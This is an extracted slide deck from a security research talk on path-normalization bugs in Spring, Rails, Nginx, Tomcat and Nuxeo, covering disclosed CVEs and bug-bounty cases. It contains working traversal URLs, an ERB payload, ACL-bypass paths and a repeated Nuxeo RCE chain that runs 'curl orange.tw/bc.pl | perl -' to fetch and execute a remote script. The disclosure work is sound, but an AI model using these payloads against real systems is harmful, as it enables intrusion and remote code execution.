Breaking Parser Logic!
Take Your Path Normalization Off and Pop 0days Out
Orange Tsai

Orange Tsai
· Security researcher at DEVCORE · Hacks in Taiwan member
orange_8361

Agenda
1. Introduce the difficulty 2. In-depthly review existing implementations 3. New multi-layered architecture attack surface

Normalize
To make standard; determine the value by comparison to an item of known standard value

Why normalization?
To protect something

Inconsistency
if (check(path)) { use(path)
}

Why path normalization
· Most web handle files(and apply lots of security mechanism) · Lack of overall security review
· Code change too fast, does the patch and protection still work? · The 3 years Mojarra story - from CVE-2013-3827 to CVE-2018-1234

How parsers could be failed?

Can you spot the vulnerability?
static String QUOTED_FILE_SEPARATOR = Pattern.quote(File.separator) static String DIRECTIVE_FILE_SEPARATOR = '/'
public AssetFile getAsset(String relativePath) { if(!relativePath) return null relativePath = relativePath.replace( QUOTED_FILE_SEPARATOR, DIRECTIVE_FILE_SEPARATOR)

replace v.s. replaceAll
String replace(String target, String replacement) String replaceAll(String regex, String replacement)

Can you spot the vulnerability?
static String QUOTED_FILE_SEPARATOR = Pattern.quote(File.separator) static String DIRECTIVE_FILE_SEPARATOR = '/'
Pattern.quote("/") = public AssetFile getAsset(String relativePath) { "\Q/\E"
if(!relativePath) return null
relativePath = relativePath.replace( QUOTED_FILE_SEPARATOR, DIRECTIVE_FILE_SEPARATOR)

..\Q/\E is the new ../ in Grails

/app/static/ v.s. /app/static
How single slash could be failed?

Nginx off-by-slash fail
· First shown in 2016 December HCTF - credit to @iaklis
· A good attack vector but very few people know · Nginx says this is not their problem
· Nginx alias directive
· Defines a replacement for the specified location

Nginx off-by-slash fail
http://127.0.0.1/static/../settings.py
location /static { alias /home/app/static/;
}
Nginx normalizes /static/../settings.py to /settings.py does not match the rule

Nginx off-by-slash fail
http://127.0.0.1/static../settings.pya
location /static { alias /home/app/static/;
}
Nginx matches the rule and appends the remainder to destination /home/app/static/../settings.py

How to find in real world

· Discovered in a private bug bounty program and got the maximum bounty from that program!

200 403 404 403 200 200

http://target/static/app.js http://target/static/ http://target/static/../settings.py http://target/static../ http://target/static../static/app.js http://target/static../settings.py

Windows treat as UNC
new URL("file:///etc/passwd?/../../Windows/win.ini")
Linux treat as URL

Polyglot URL path
· Applications relied on getPath() in Windows
URL base = new URL("file:///C:/Windows/temp/"); URL url = new URL(base, "file?/../../win.ini");
· Normalized result from getFile() or toExternalForm() in Linux
URL base = new URL("file:///tmp/"); URL url = new URL(base, "../etc/passwd?/../../tmp/file");

0days I found

Ruby on Rails Sinatra
Spring Framework Spark Framework
Jenkins Mojarra Next.js resolve-path Aiohttp Lighttpd

CVE CVE-2018-3760 CVE-2018-7212 CVE-2018-1271 CVE-2018-9159
Pending Pending CVE-2018-6184 CVE-2018-3732
None Pending

Agenda
1. Introduce the difficulty 2. In-depthly review existing implementations
· Discovered Spring Framework CVE-2018-1271 · Discovered Ruby on Rails CVE-2018-3760
3. New multi-layered architectures attack surface

Spring 0day - CVE-2018-1271
· Directory Traversal with Spring MVC on Windows · The patch of CVE-2014-3625
1. isInvalidPath(path) 2. isInvalidPath(URLDecoder.decode(path, "UTF-8")) 3. isResourceUnderLocation(resource, location)

1 protected boolean isInvalidPath(String path) {

2

if (path.contains("WEB-INF") || path.contains("META-INF")) {

3

return true;

4

}

5

if (path.contains(":/")) {

6

return true;

7

}

8

if (path.contains("..")) {

9

path = cleanPath(path);

10

if (path.contains("../"))

11

return true;

12

}

13

14

return false;

Dangerous Pattern :(

15 }

1 public static String cleanPath(String path) {

2

String pathToUse = replace(path, "\\", "/");

3

4

String[] pathArray = delimitedListToStringArray(pathToUse, "/");

5

List<String> pathElements = new LinkedList<>();

6

int tops = 0;

7

8

for (int i = pathArray.length - 1; i >= 0; i--) {

9

String element = pathArray[i];

10

if (".".equals(element)) {

11

12

} else if ("..".equals(element)) {

13

tops++;

14

} else {

15

if (tops > 0)

16

tops--;

17

else

18

pathElements.add(0, element);

19

}

20

}

21

22

for (int i = 0; i < tops; i++) {

23

pathElements.add(0, "..");

24

}

25

return collectionToDelimitedString(pathElements, "/");

26 }

1 public static String cleanPath(String path) {

2

String pathToUse = replace(path, "\\", "/");

3

4

String[] pathArray = delimitedListToStringArray(pathToUse, "/");

5

List<String> pathElements = new LinkedList<>();

6

int tops = 0;

7

8

for (int i = pathArray.length - 1; i >= 0; i--) {

9

String element = pathArray[i];

10

if (".".equals(element)) {

11

12

} else if ("..".equals(element)) {

13

tops++;

14

} else {

15

if (tops > 0)

Allow empty element?

16

tops--;

17

else

18

pathElements.add(0, element);

19

}

20

}

21

22

for (int i = 0; i < tops; i++) {

23

pathElements.add(0, "..");

24

}

25

return collectionToDelimitedString(pathElements, "/");

26 }

Spring 0day - CVE-2018-1271

Input / /../ /foo/../ /foo/../../ /foo//../ /foo///../../ /foo////../../../

cleanPath / /../ / /../ /foo/ /foo/ /foo/

File system / /../ / /../ / /../ /../../

Spring 0day - CVE-2018-1271
· How to exploit?
$ git clone git@github.com:spring-projects/spring-amqp-samples.git $ cd spring-amqp-samples/stocks $ mvn jetty:run
http://127.0.0.1:8080/spring-rabbit-stock/static/%255c%255c%255c%255c%255c %255c..%255c..%255c..%255c..%255c..%255c..%255c/Windows/win.ini

Spring 0day - CVE-2018-1271

· Code infectivity? Spark framework CVE-2018-9159
· A micro framework for web application in Kotlin and Java 8

commit 27018872d83fe425c89b417b09e7f7fd2d2a9c8c Author: Per Wendel <per.i.wendel@gmail.com> Date: Sun May 18 12:04:11 2014 +0200

+ public static String cleanPath(String path) {

+

if (path == null) {

+

...

Rails 0day - CVE-2018-3760
· Path traversal on @rails/sprockets · Sprockets is the asset pipeline system in Rails · Affected Rails under development environment
· Or production mode with assets.compile flag on

Vulnerable enough!
$ rails new blog && cd blog $ rails server Listening on tcp://0.0.0.0:3000

Rails 0day - CVE-2018-3760
1. Sprockets supports file:// scheme that bypassed absolute_path? 2. URL decode bypassed double slashes normalization 3. Method split_file_uri resolved URI and unescape again
· Lead to double encoding and bypass forbidden_request? and prefix check
http://127.0.0.1:3000/assets/file:%2f%2f/app/assets/images /%252e%252e/%252e%252e/%252e%252e/etc/passwd

For the RCE lover

/tmp/evil.erb

· This vulnerability is possible to RCE

<%=`id`%>

· Inject query string %3F to File URL

· Render as ERB template if the extension is .erb

http://127.0.0.1:3000/assets/file:%2f%2f/app/assets/images/%252e%252e /%252e%252e/%252e%252e/tmp/evil.erb%3ftype=text/plain

·

By Michael Saechang @Flickr

By Jonathan Leung @Flickr

By daisuke1230 @Flickr

Agenda
1. Introduce the difficulty 2. In-depthly review existing implementations 3. New multi-layered architecture attack surface
· Remote Code Execution on Bynder · Remote Code Execution on Amazon
P.S. Thanks Amazon and Bynder for the quick response time and open-minded vulnerability disclosure

URL path parameter
· d http://example.com/foo;name=orange/bar/
· Some researchers already mentioned this may lead issues but it still depended on programming fails
· How to teach an old dog new tricks?

Reverse proxy architecture
9 Share resource 9 Load balance 9 Cache 9 Security

Client

static files - images - scripts - files

Tomcat Apache

Multi-layered architectures

http://example.com/foo;name=orange/bar/

Apache Nginx
IIS Tomcat Jetty WildFly WebLogic

Behavior /foo;name=orange/bar/ /foo;name=orange/bar/ /foo;name=orange/bar/
/foo/bar/ /foo/bar/
/foo /foo

BadProxy.org
Not really! Just a joke

How this vuln could be?
· Bypass whitelist and blacklist ACL · Escape from context mapping
· Management interface · Web container console and monitor · Web contexts on the same server

Am I affected by this vuln?
· This is an architecture problem and vulnerable by default if you are using reverse proxy and Java as backend service
· Apache mod_jk · Apache mod_proxy · Nginx ProxyPass ·...

/..;/ seems like a directory, pass to you
http://example.com/portal/..;/manager/html
Shit! /..;/ is parent directory

/..;/ seems like a directory, pass to you
http://example.com/portal/..;/manager/html
Shit! /..;/ is parent directory

Uber bounty case
· Uber disallow directly access *.uberinternal.com
· Redirect to OneLogin SSO by Nginx · A whitelist for monitor purpose?
https://jira.uberinternal.com/status

/..;/ seems like a directory, match /status whitelist
https://jira.uberinternal.com/status/..;/secure/Dashboard.jspa
Oh shit! /..;/ is parent directory

/..;/ seems like a directory, match /status whitelist
https://jira.uberinternal.com/status/..;/secure/Dashboard.jspa
Oh shit! /..;/ is parent directory

Amazon RCE case study
· Remote Code Execution on Amazon Collaborate System · Found the site collaborate-corp.amazon.com
· Running an open source project Nuxeo · Chained several bugs and features to RCE

Path normalization bug leads to ACL bypass
How ACL fetch current request page?
protected static String getRequestedPage(HttpServletRequest httpRequest) { String requestURI = httpRequest.getRequestURI(); String context = httpRequest.getContextPath() + '/'; String requestedPage = requestURI.substring(context.length()); int i = requestedPage.indexOf(';'); return i == -1 ? requestedPage : requestedPage.substring(0, i);
}

Path normalization bug leads to ACL bypass

The path processing in ACL control is inconsistent with servlet container so that we can bypass whitelists

URL /login;foo /login;foo/bar;quz /login;/..;/admin

ACL control /login /login /login

Tomcat /login /login/bar /login/../admin

Code reuse bug leads to Expression Language injection
· Most pages return NullPointerException :( · Nuxeo maps *.xhtml to Seam Framework · We found Seam exposed numerous Hacker-Friendly features
by reading source code

Seam Feature
aahuatttipl:s/./e1s2c7a.p0e.(0...1./)home.xhtml?actionMethod:/foo.xhtml: If there is a foo.xhtml under servlet context you can execute the partial EL by actionMethod
foo.xhtml
"#{util.escape(...)}"

To make thing worse, Seam will evaluate again if the previous EL return string like an EL

http://127.0.0.1/home.xhtml?actionMethod:/foo.xhtml: utils.escape(...)

foo.xhtml
"#{util.escape(...)}"

return

type(string)
#{malicious}

evaluate

Code reuse bug leads to Expression Language injection
We can execute partial EL in any file under servlet context but need to find a good gadget to control the return value
widgets/suggest_add_new_directory_entry_iframe.xhtml
<nxu:set var="directoryNameForPopup" value="#{request.getParameter('directoryNameForPopup')}" cache="true">

Code reuse bug leads to Expression Language injection
We can execute partial EL in any file under servlet context but need to find a good gadget to control the return value
widgets/suggest_add_new_directory_entry_iframe.xhtml
<nxu:set var="directoryNameForPopup" value="#{request.getParameter('directoryNameForPopup')}" cache="true">

EL blacklist bypassed leads to Remote Code Execution

We can execute arbitrary EL but fail to run a command

org/jboss/seam/blacklist.properties

getClass( class. addRole( getPassword( removeRole(

"".getClass().forName("java.lang.Runtime") ""["class"].forName("java.lang.Runtime")

Chain all together
1. Path normalization bug leads to ACL bypass 2. Bypass whitelist to access unauthorized Seam servlet 3. Use Seam feature actionMethod to invoke gadgets in files 4. Prepare second stage payload in directoryNameForPopup 5. Bypass EL blacklist and use Java reflection API to run shell command

https://host/nuxeo/login.jsp;/..;/create_file.xhtml
?actionMethod=
widgets/suggest_add_new_directory_entry_iframe.xhtml: request.getParameter('directoryNameForPopup')
&directoryNameForPopup=
/?=#{ request.setAttribute( 'methods', ''['class'].forName('java.lang.Runtime').getDeclaredMethods() ) --request.getAttribute('methods')[15].invoke( request.getAttribute('methods')[7].invoke(null), 'curl orange.tw/bc.pl | perl -' )
}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml
?actionMethod=
widgets/suggest_add_new_directory_entry_iframe.xhtml: request.getParameter('directoryNameForPopup')
&directoryNameForPopup=
/?=#{ request.setAttribute( 'methods', ''['class'].forName('java.lang.Runtime').getDeclaredMethods() ) --request.getAttribute('methods')[15].invoke( request.getAttribute('methods')[7].invoke(null), 'curl orange.tw/bc.pl | perl -' )
}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml
?actionMethod=
widgets/suggest_add_new_directory_entry_iframe.xhtml: request.getParameter('directoryNameForPopup')
&directoryNameForPopup=
/?=#{ request.setAttribute( 'methods', ''['class'].forName('java.lang.Runtime').getDeclaredMethods() ) --request.getAttribute('methods')[15].invoke( request.getAttribute('methods')[7].invoke(null), 'curl orange.tw/bc.pl | perl -' )
}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml
?actionMethod=
widgets/suggest_add_new_directory_entry_iframe.xhtml: request.getParameter('directoryNameForPopup')
&directoryNameForPopup=
/?=#{ request.setAttribute( 'methods', ''['class'].forName('java.lang.Runtime').getDeclaredMethods() ) --request.getAttribute('methods')[15].invoke( request.getAttribute('methods')[7].invoke(null), 'curl orange.tw/bc.pl | perl -' )
}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml
?actionMethod=
widgets/suggest_add_new_directory_entry_iframe.xhtml: request.getParameter('directoryNameForPopup')
&directoryNameForPopup=
/?=#{ request.setAttribute( 'methods', ''['class'].forName('java.lang.Runtime').getDeclaredMethods() ) --request.getAttribute('methods')[15].invoke( request.getAttribute('methods')[7].invoke(null), 'curl orange.tw/bc.pl | perl -' )
}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml
?actionMethod=
widgets/suggest_add_new_directory_entry_iframe.xhtml: request.getParameter('directoryNameForPopup')
&directoryNameForPopup=
/?=#{ request.setAttribute( 'methods', ''['class'].forName('java.lang.Runtime').getDeclaredMethods() ) --request.getAttribute('methods')[15].invoke( request.getAttribute('methods')[7].invoke(null), 'curl orange.tw/bc.pl | perl -' )
}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml
?actionMethod=
widgets/suggest_add_new_directory_entry_iframe.xhtml: request.getParameter('directoryNameForPopup')
&directoryNameForPopup=
/?=#{ request.setAttribute( 'methods', ''['class'].forName('java.lang.Runtime').getDeclaredMethods() ) --request.getAttribute('methods')[15].invoke( request.getAttribute('methods')[7].invoke(null), 'curl orange.tw/bc.pl | perl -' )
}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml
?actionMethod=
widgets/suggest_add_new_directory_entry_iframe.xhtml: request.getParameter('directoryNameForPopup')
&directoryNameForPopup=
/?=#{ request.setAttribute( 'methods', ''['class'].forName('java.lang.Runtime').getDeclaredMethods() ) --request.getAttribute('methods')[15].invoke( request.getAttribute('methods')[7].invoke(null), 'curl orange.tw/bc.pl | perl -' )
}

Summary
1. Implicit properties and edge cases on path parsers 2. New attack surface on multi-layered architectures 3. Case studies in new CVEs and bug bounty programs

Mitigation
· Isolate the backend application
· Remove the management console · Remote other servlet contexts
· Check behaviors between proxy and backend servers
· Just a Proof-of-Concept to disable URL path parameter on both Tomcat and Jetty

References
· Java Servlets and URI Parameters
By @cdivilly
· 2 path traversal defects in Oracle's JSF2 implementation
By Synopsys Editorial Team
· CVE-2010-1871: JBoss Seam Framework remote code execution
By @meder

Thanks!
orange_8361 orange@chroot.org

